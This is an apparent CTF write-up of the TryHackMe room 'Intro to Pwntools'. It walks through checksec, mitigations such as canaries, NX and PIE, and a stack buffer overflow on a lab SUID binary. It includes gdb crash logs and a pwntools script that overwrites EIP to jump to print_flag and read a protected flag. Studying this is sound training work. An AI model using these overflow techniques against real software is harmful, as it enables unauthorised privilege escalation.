# Intro To Pwntools — Writeup

## Overview
### Intro To Pwntools — Writeup
### Intro To Pwntools — Writeup
----
An introductory room for the binary exploit toolkit Pwntools.
---
![](https://raw.githubusercontent.com/Gallopsled/pwntools/stable/docs/source/logo.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/2eb62778d0ace3b308a4f635c198aff7.png)
### Introduction
Start Machine
Hello there, and welcome to Intro to Pwntools!
My name is DiZma$ and I will be your guide through this journey of software exploitation. When I started learning binary exploitation and CTFs, I learned that many CTF players use Pwntools, but when I searched for a basic guide on how to get started, I found little on the topic. Because of this, I set out to create my own tutorial. According to the Pwntools github, "Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible" ([Pwntools Github page](https://github.com/Gallopsled/pwntools)).
Prior experience in binary exploitation is not required for this room, although it may help. I will provide brief explanations, although if you would like more in-depth material, I will try to direct you to some helpful sources.
**Tools and Installation:**
The tools and challenges for today are on the provided VM, although if you would like, you can set them up on your own machine:
Pwntools can be installed through pip. You can follow the installation guide here: [https://docs.pwntools.com/en/stable/install.html](https://docs.pwntools.com/en/stable/install.html). Please note, I have set up Pwntools with python2 on the VM for today, because I prefer exploit development in python2.
The other tool we will be using is pwndbg, which is "a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers" ([pwndbg Github page](https://github.com/pwndbg/pwndbg)). If you have ever used gdb for binary exploitation, you know it can be cumbersome. Pwndbg prints out useful information, such as registers and assembly code, with each breakpoint or error, making debugging and dynamic analysis easier. To install it, you can refer to the Github page. All you need to do is download it from Github and run the setup script, and it will automatically attach to gdb.
Lastly, if you would like to download the challenges from this room to use on your own machine, you can find them (and my solutions) on my Github: [https://github.com/dizmascyberlabs/IntroToPwntools](https://github.com/dizmascyberlabs/IntroToPwntools).
**Starting up the machine and Logging in:**
Please start up the attached VM. Once it is started, you can ssh into it with the following credentials:
user: buzz
pass: buzz
`ssh buzz@MACHINE_IP`
`buzz@MACHINE_IP's password: buzz`
Please note that after typing in the password, you may have to wait a few seconds before you are logged in.
Let's get pwning!
Answer the questions below
```text
┌──(witty㉿kali)-[~/Programacion]
└─$ apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools

┌──(witty㉿kali)-[~/Programacion]
└─$ export PATH="$PATH:/home/witty/.local/bin"
```
I understand how to set up Pwntools and pwndbg on my own machine.
Completed
I have started the machine, and logged in through ssh.
Completed
### Checksec
In your home directory, you should see two directories, IntroToPwntools and pwndbg.  Our challenges are in IntroToPwntools. If you enter that directory, you will see a note, and another directory of the same name.  When you are ready, enter the second IntroToPwntools directory to begin your adventure!
**Checksec tool**
You will find the four directories enclosed: checksec, cyclic, networking, and shellcraft. We will start with checksec.
Inside the checksec directory, we will find some c code and executables, both compiled from the c code. If you run either one, they seem to be the same program: it prompts for the user's name, and replies "Hello name!" These binaries may appear to be the same program, but one was compiled with protections to mitigate binary exploitation, while the other was compiled without these protections.
Run the following command and observe the result (as a warning, this command can be a little slow):
`checksec intro2pwn1`
Now run the same command with intro2pwn2.
As you can see, these binaries both have the same architecture (i386-32-little), but differ in qualities such as RELRO, Stack canaries , NX, PIE, and RWX. Now, what are these qualities? Allow me to explain. Please note, this room does not require a deep knowledge of these beyond the basics.
**RELRO** stands for Relocation Read-Only, which makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack, although this is outside the scope of this room. If you are interested, you can refer to this blog post: [https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro).
**Stack canaries** are tokens placed after a stack to detect a stack overflow. These were supposedly named after birds that coal miners brought down to mines to detect noxious fumes. Canaries were sensitive to the fumes, and so if they died, then the miners knew they needed to evacuate. On a less morbid note, stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. You can read more about stack canaries here: [https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/).
**NX** is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed.  On the vulnerable binary, you may have noticed the extra line **RWX** that indicates that there are segments which can be read, written, and executed. See this Wikipedia article for more details: [https://en.wikipedia.org/wiki/Executable_space_protection](https://en.wikipedia.org/wiki/Executable_space_protection)
**PIE** stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. Here is a good blog about this: [https://access.redhat.com/blogs/766093/posts/1975793](https://access.redhat.com/blogs/766093/posts/1975793)[](https://access.redhat.com/blogs/766093/posts/1975793)
If you want a good overview of each of the checksec tested qualities, I have found this guide to be useful: [https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/)
Answer the questions below
```text
┌──(witty㉿kali)-[~/Programacion]
└─$ ssh buzz@10.10.5.139
The authenticity of host '10.10.5.139 (10.10.5.139)' can't be established.
ED25519 key fingerprint is SHA256:s+GTNY+6iPIeezJnDWpHuYl+mribdlz0LZbS+E58NhU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.5.139' (ED25519) to the list of known hosts.
buzz@10.10.5.139's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 17 21:40:46 UTC 2023

  System load:  0.98              Processes:           102
  Usage of /:   56.3% of 8.79GB   Users logged in:     0
  Memory usage: 20%               IP address for eth0: 10.10.5.139
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.

Last login: Thu Jun 10 02:22:06 2021 from 10.0.2.12
buzz@intro2pwn:~$ whoami
buzz
buzz@intro2pwn:~$ ls
IntroToPwntools  pwndbg
buzz@intro2pwn:~$ cd IntroToPwntools/
buzz@intro2pwn:~/IntroToPwntools$ ls
IntroToPwntools  note.txt
buzz@intro2pwn:~/IntroToPwntools$ cat note.txt 

Dear buzz,
Welcome to Intro to Pwntools!
In this folder, you will find
a wonderful adventure of 
binary exploitation!

Sincerely,
dizmas

buzz@intro2pwn:~/IntroToPwntools$ cd IntroToPwntools/
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools$ ls
checksec  cyclic  networking  shellcraft
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools$ cd checksec/
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ ls
intro2pwn1  intro2pwn2  test_checksec.c

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ cat test_checksec.c 
#include <stdio.h>

int main(){
	char name[12];
	printf("Please input your name: ");
	gets(name);
	printf("Hello %s!\n", name);
	return 0;
}

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn1
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn2
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

RELRO (RELocation Read-Only) is a security feature that is commonly used in Linux-based operating systems to prevent certain types of memory-based attacks. When RELRO is enabled, the linker sets the global offset table (GOT) and the procedure linkage table (PLT) to read-only, preventing them from being modified at runtime.

The GOT and PLT are data structures that are used by programs to resolve symbols (i.e., functions and variables) at runtime. They contain pointers to the actual memory locations of the symbols, which are resolved when the program is executed. However, attackers can exploit these data structures by overwriting them with their own values, causing the program to execute malicious code or perform unintended actions.

By setting the GOT and PLT to read-only, RELRO prevents attackers from modifying these data structures, making it harder to execute certain types of memory-based attacks. It is important to note that there are different levels of RELRO, with "full" RELRO being the most secure, as it also makes the dynamic linker read-only.

In simpler terms, RELRO is a security feature that makes certain parts of a program's memory read-only, which prevents attackers from modifying them and executing malicious code. It is a useful defense against certain types of memory-based attacks.

A stack canary, also known as a stack cookie, is a security mechanism used to prevent buffer overflow attacks. When a function is called, the CPU allocates a section of memory called the stack to store local variables and function parameters. A buffer overflow attack occurs when an attacker writes more data to a buffer than it can hold, causing the data to overwrite adjacent memory, which could include a return address or other critical data.

To prevent buffer overflow attacks, the compiler inserts a stack canary into the stack frame. The canary is a random value that is placed between the local variables and the return address. Before returning from the function, the CPU checks the value of the canary. If the canary has been overwritten, the CPU raises an exception and terminates the program.

The purpose of the stack canary is to detect when an attacker has overwritten the stack and is attempting to execute malicious code. Because the canary is a random value, an attacker cannot predict its value and will not be able to overwrite it with their own data.

In simpler terms, a stack canary is a random value inserted into a function's stack frame to prevent buffer overflow attacks. The canary acts as a security guard that checks whether the stack has been modified and raises an alarm if it has. This helps to prevent attackers from executing malicious code by detecting and terminating the program when an attack is detected.

Position Independent Executables (PIE) is a security feature that makes it more difficult for attackers to exploit software vulnerabilities. PIE is a technique that randomizes the memory location of the code and data sections of an executable file each time it is loaded into memory.

Traditionally, executable files are loaded at fixed memory addresses. This means that an attacker can use knowledge of the memory layout to bypass certain security measures or execute malicious code. PIE works by making the base address of the executable unpredictable, making it harder for an attacker to determine the location of key pieces of data or code.

PIE works by adding extra instructions to the compiled executable that handle the address randomization at runtime. When the program is loaded, a random value is generated that determines the offset between the base address of the executable and the address at which the code and data sections are loaded. This means that the same program can be loaded into different memory addresses each time it is executed, making it harder for an attacker to exploit software vulnerabilities.

In simpler terms, PIE is a security technique that randomizes the memory location of an executable each time it is loaded into memory. This makes it more difficult for attackers to locate and exploit vulnerabilities in the software. By making the memory address of the code and data sections unpredictable, PIE helps to make software more secure.

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn1
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)

In this scenario, it looks like a buffer overflow has occurred. The program `intro2pwn1` prompts the user to input their name and then greets them. However, it seems that the input buffer for the name is not properly bounded or checked for size limits, and as a result, a user can input more data than the buffer can hold, causing a buffer overflow.

In this case, it seems that the buffer overflow has triggered a stack smashing protection mechanism, which is designed to detect and prevent such attacks. When the program detects that the stack has been smashed, it terminates with an error message.

To fix this issue, the program should properly check the size of the input buffer and make sure that it cannot be overflowed. One common approach to this is to use the `fgets` function instead of `gets`, since `fgets` allows the programmer to specify a maximum size for the input buffer. Alternatively, the program could use a different string input function such as `scanf` with the appropriate format specifier, which would also allow the programmer to specify a maximum buffer size.

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn2
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault (core dumped)

In this scenario, it looks like a segmentation fault has occurred. The program `intro2pwn2` prompts the user to input their name and then greets them, but it appears that the input buffer for the name is not properly bounded or checked for size limits, resulting in a buffer overflow. This buffer overflow has caused the program to try to access memory that it is not allowed to, which triggers a segmentation fault.

A segmentation fault occurs when a program tries to access memory that it is not allowed to access. This can happen for a variety of reasons, such as attempting to read or write to an address that is outside the program's address space, or attempting to access memory that has not been properly allocated or has already been deallocated.

To fix this issue, the program should properly check the size of the input buffer and make sure that it cannot be overflowed. One common approach to this is to use a function like `fgets` or `scanf` to read input, since these functions allow the programmer to specify a maximum size for the input buffer. The program should also make sure to properly allocate and deallocate memory as needed to avoid segmentation faults caused by memory access violations.
```
Does Intro2pwn1 have FULL RELRO (Y or N)?
*Y*
Does Intro2pwn1 have RWX segments (Y or N)?
*N*
Does Intro2pwn2 have a stack canary (Y or N)?
*N*
Does Intro2pwn2 not have PIE (Y or N)?
*Y*
Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected?
Buzz smash!
*stack smashing*
Now cause a buffer overflow on intro2pwn2. What error do you get?
This is often shortened to seg-fault. These are good news for the hacker. It means that you have directed the instruction pointer to an invalid place in memory. More on that later...
*segmentation fault*
### Cyclic
Good work! Now cd out of the checksec directory. Next on our itinerary is the cyclic directory. You should find 4 files there: a text of alphabet characters, a flag file, an executable, and the code for the executable. If we try to read the flag file, we are denied permission. If only we could get somebody else to open it...
**Setting the stage:**
if you run the command:
`ls -l`
﻿You will see that the flag file and intro2pwn3 are owned by the same user, and that the suid bit is set for intro2pwn3. This means that the program will keep its permissions when it executes. Please answer question 1.
If you view the c code, you may notice the print_flag() function, which will open the flag with the permissions we need. The issue is that the function does not run in the program, the program simply calls start() then ends. What if we could redirect the execution somehow? In fact, we can!
This program is vulnerable to a buffer overflow, because it uses the gets() function, which does not check to see if the user input is actually in bounds (you can read about this [here](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351)). In our case, the name variable has 24 bytes allocated, so if we input more than 24 bytes, we can write to other parts of memory. Please answer question 2.
An important part of the memory we can overwrite is the instruction pointer (IP), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in our binary to the print_flag() function, we can print the flag.
**Cyclic tool:**
To control the IP, the first thing we need do is to is overflow the stack with a pattern, so we can see where the IP is. I have provided the alphabet file as a pattern. Let's fire up gdb!
`gdb intro2pwn3`
To run a program in gdb, type `r`. You will see the program function normally. If you want to add an input from a text file, you use the "<" key, as such:
`r < alphabet`
We've caused a segmentation fault, and you may observe that there is an invalid address at 0x4a4a4a4a. If you scroll up, you can see the values at each register. For eip, it has been overwritten with 0x4a4a4a4a. Please answer question 3.
Great, now we see that we can control the eip! Before we move on, I would like to talk about patterns. The alphabet file was useful here, but it can be time consuming to type all of that into a file (or write a script for it) every time you want to test a buffer overflow, and if the buffer is large, the alphabet file might not be big enough. This is where the cyclic tool comes in. The cyclic tool can be used both from the command line and in python scripts. The command line format is "cyclic number", like:
`cyclic 100`
This will print out a pattern of 100 characters Please quit gdb by typing "quit" and answer question 4.
If you have used pattern_create from the Metasploit Framework, this is works in a similar way. We can create a pattern file like this:
`cyclic 100 > pattern`
and then run the pattern file as input in gdb like we did with the alphabet file. Once again, we have a seg-fault and the eip is filled with 'jaaa' (please answer question 5).
**Pwning to the flag:**
﻿We can now begin to develop our exploit. To use pwntools in a python file, create a python file (mine is pwn_cyclic.py) and import the pwntools module at the top of the file:
`from pwn import *`
We can then use the cyclic function within the python code:
`padding = cyclic(100)`
Our padding is the space we need to get to the eip, so 100 is not the number we need. We need our padding to stop right before 'jaaa' so that we can fill in the eip with our own input. Luckily, there is a function in pwntools called cyclic_find(), which will find this automatically. Please replace the 100 with cyclic_find('jaaa'):
`padding = cyclic(cyclic_find('jaaa'))`
What do we fill the eip with? For now, to make sure we have the padding correct, we should fill it with a dummy value, like 0xdeadbeef. We cannot, of course, simply write "0xdeadbeef" as a string, because the computer would interpret it as ascii, and we need it as raw hex. Pwntools offers an easy way to do this, with the p32() function (and p64 for 64-bit programs). This is similar to the struct.pack() function, if you have ever used it. We can add this to our code:
`eip = p32(0xdeadbeef)`
Now our entire code should look like this:
`from pwn import *`
`padding = cyclic(cyclic_find('jaaa'))`
`eip = p32(0xdeadbeef)`
`payload = padding + eip`
`print(payload)`
Please run the file with python (not python3!) and output to a text file (my python file is called pwn_cyclic.py and my text file is called attack).
`python pwn_cyclic.py > attack`
Run this new text file as input to intro2pwn3 in gdb, and make sure that you get an invalid address at 0xdeadbeef. Please answer question 6.
The last thing we need to do is find the location of the print_flag() function. To find the print_flag() funtion, type this command into gdb:
`print& print_flag`
For me, the print_flag() function is at 0x8048536, please check to see if it is the same for you.
Replace the 0xdeadbeef in your code with the location of the print_flag function. Once, again, we can run:
`python pwn_cyclic.py > attack`
Input the attack file into the intro2pwn3 binary in the command line (because gdb will not use the suid permissions), like this:
`./intro2pwn3 < attack`
Yay, a flag! Please answer question 7.
Answer the questions below
```text
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ cd ..
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools$ ls
checksec  cyclic  networking  shellcraft
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools$ cd cyclic/
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
alphabet  flag.txt  intro2pwn3  test_cyclic.c

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat flag.txt
cat: flag.txt: Permission denied
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat alphabet 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat test_cyclic.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_flag() {
	printf("Getting Flag:\n");
	fflush(stdout);
	char *cat_flag[3] = {"/bin/cat", "flag.txt", NULL};
	execve("/bin/cat", cat_flag,  NULL);
	exit(0);
}

void start(){
	char name[24];
	gets(name);
}

int main(){
	printf("I run as dizmas.\n");
	printf("Who are you?: ");
	start();

}

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls -l
total 20
-rw-rw-r-- 1 buzz   buzz    105 May 19  2021 alphabet
-r--r----- 1 dizmas dizmas   22 May 19  2021 flag.txt
-rwsrwxr-x 1 dizmas dizmas 7444 May 19  2021 intro2pwn3
-rw-rw-r-- 1 buzz   buzz    359 Jun 10  2021 test_cyclic.c

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ checksec intro2pwn3
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3 
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...(no debugging symbols found)...done.
pwndbg> r < alphabet
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < alphabet
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x4a4a4a4a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
 EAX  0xffa49e68 ◂— 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EBX  0x48484848 ('HHHH')
 ECX  0xf7ed45c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 EDX  0xf7ed589c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0x0
 ESI  0xf7ed4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x49494949 ('IIII')
 ESP  0xffa49e90 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EIP  0x4a4a4a4a ('JJJJ')
─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
Invalid address 0x4a4a4a4a

─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ esp 0xffa49e90 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
01:0004│     0xffa49e94 ◂— 'LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
02:0008│     0xffa49e98 ◂— 'MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
03:000c│     0xffa49e9c ◂— 'NNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
04:0010│     0xffa49ea0 ◂— 'OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
05:0014│     0xffa49ea4 ◂— 'PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
06:0018│     0xffa49ea8 ◂— 'QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
07:001c│     0xffa49eac ◂— 'RRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► f 0 0x4a4a4a4a
   f 1 0x4b4b4b4b
   f 2 0x4c4c4c4c
   f 3 0x4d4d4d4d
   f 4 0x4e4e4e4e
   f 5 0x4f4f4f4f
   f 6 0x50505050
   f 7 0x51515151

pwndbg> cyclic 12
aaaabaaacaaa
pwndbg> quit

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cyclic 100 > pattern
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat pattern 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaabuzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3 
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...(no debugging symbols found)...done.
pwndbg> r < pattern
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < pattern
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x6161616a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
 EAX  0xff885a98 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616168 ('haaa')
 ECX  0xf7f0a5c0 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xf7f0b89c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0x0
 ESI  0xf7f0a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x61616169 ('iaaa')
 ESP  0xff885ac0 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x6161616a ('jaaa')
─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
Invalid address 0x6161616a

─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ esp 0xff885ac0 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xff885ac4 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xff885ac8 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xff885acc ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xff885ad0 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xff885ad4 ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xff885ad8 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xff885adc ◂— 'raaasaaataaauaaavaaawaaaxaaayaaa'
───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► f 0 0x6161616a
   f 1 0x6161616b
   f 2 0x6161616c
   f 3 0x6161616d
   f 4 0x6161616e
   f 5 0x6161616f
   f 6 0x61616170
   f 7 0x61616171
──────────────────────────

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ nano pwn_cyclic.py
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat pwn_cyclic.py 
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaﾭ�

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py > attack
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat attack 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaﾭ�

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3 
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...(no debugging symbols found)...done.
pwndbg> r < attack
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < attack
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
 EAX  0xff982138 ◂— 0x61616161 ('aaaa')
 EBX  0x61616168 ('haaa')
 ECX  0xf7ed25c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 EDX  0xf7ed389c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0x0
 ESI  0xf7ed2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x61616169 ('iaaa')
 ESP  0xff982160 —▸ 0xff982100 —▸ 0xff982158 ◂— 0x61616169 ('iaaa')
 EIP  0xdeadbeef
─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
Invalid address 0xdeadbeef

─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ esp 0xff982160 —▸ 0xff982100 —▸ 0xff982158 ◂— 0x61616169 ('iaaa')
01:0004│     0xff982164 ◂— 0x0
02:0008│     0xff982168 ◂— 0x0
03:000c│     0xff98216c —▸ 0xf7d12f21 (__libc_start_main+241) ◂— add    esp, 0x10
04:0010│     0xff982170 —▸ 0xf7ed2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
05:0014│     0xff982174 —▸ 0xf7ed2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
06:0018│     0xff982178 ◂— 0x0
07:001c│     0xff98217c —▸ 0xf7d12f21 (__libc_start_main+241) ◂— add    esp, 0x10
───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► f 0 0xdeadbeef
──────────────────
print& print_flag
$1 = (<text variable, no debug info> *) 0x8048536 <print_flag>

